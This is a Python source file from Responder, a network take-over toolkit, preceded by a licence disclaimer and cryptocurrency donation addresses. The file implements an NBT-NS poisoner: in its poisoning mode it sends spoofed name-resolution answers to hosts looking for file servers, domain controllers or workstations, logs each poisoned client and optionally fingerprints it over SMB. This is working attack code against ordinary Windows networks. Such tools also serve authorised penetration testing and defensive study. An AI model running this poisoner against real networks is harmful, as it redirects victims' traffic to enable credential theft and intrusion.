'''THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, TITLE AND
NON-INFRINGEMENT. IN NO EVENT SHALL THE COPYRIGHT HOLDERS OR ANYONE
DISTRIBUTING THE SOFTWARE BE LIABLE FOR ANY DAMAGES OR OTHER LIABILITY,
WHETHER IN CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.'''

# Bitcoin Cash (BCH)   qpz32c4lg7x7lnk9jg6qg7s4uavdce89myax5v5nuk
# Ether (ETH) -        0x843d3DEC2A4705BD4f45F674F641cE2D0022c9FB
# Litecoin (LTC) -     Lfk5y4F7KZa9oRxpazETwjQnHszEPvqPvu
# Bitcoin (BTC) -      34L8qWiQyKr8k4TnHDacfjbaSqQASbBtTd

# contact :- github@jamessawyer.co.uk



#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import fingerprint

from packets import NBT_Ans
from SocketServer import BaseRequestHandler
from utils import *

# Define what are we answering to.


def Validate_NBT_NS(data):
    if settings.Config.AnalyzeMode:
        return False
    elif NBT_NS_Role(data[43:46]) == "File Server":
        return True
    elif settings.Config.NBTNSDomain:
        if NBT_NS_Role(data[43:46]) == "Domain Controller":
            return True
    elif settings.Config.Wredirect:
        if NBT_NS_Role(data[43:46]) == "Workstation/Redirector":
            return True
    return False

# NBT_NS Server class.


class NBTNS(BaseRequestHandler):

    def handle(self):

        data, socket = self.request
        Name = Decode_Name(data[13:45])

        # Break out if we don't want to respond to this host
        if RespondToThisHost(self.client_address[0], Name) is not True:
            return None

        if data[2:4] == "\x01\x10":
            Finger = None
            if settings.Config.Finger_On_Off:
                Finger = fingerprint.RunSmbFinger(
                    (self.client_address[0], 445))

            if settings.Config.AnalyzeMode:  # Analyze Mode
                LineHeader = "[Analyze mode: NBT-NS]"
                print color(
                    "%s Request by %s for %s, ignoring" %
                    (LineHeader, self.client_address[0], Name), 2, 1)
                SavePoisonersToDb({
                    'Poisoner': 'NBT-NS',
                    'SentToIp': self.client_address[0],
                    'ForName': Name,
                    'AnalyzeMode': '1',
                })
            else:  # Poisoning Mode
                Buffer = NBT_Ans()
                Buffer.calculate(data)
                socket.sendto(str(Buffer), self.client_address)
                LineHeader = "[*] [NBT-NS]"

                print color("%s Poisoned answer sent to %s for name %s (service: %s)" % (
                    LineHeader, self.client_address[0], Name, NBT_NS_Role(data[43:46])), 2, 1)

                SavePoisonersToDb({
                    'Poisoner': 'NBT-NS',
                    'SentToIp': self.client_address[0],
                    'ForName': Name,
                    'AnalyzeMode': '0',
                })

            if Finger is not None:
                print text(
                    "[FINGER] OS Version     : %s" %
                    color(
                        Finger[0], 3))
                print text(
                    "[FINGER] Client Version : %s" %
                    color(
                        Finger[1], 3))
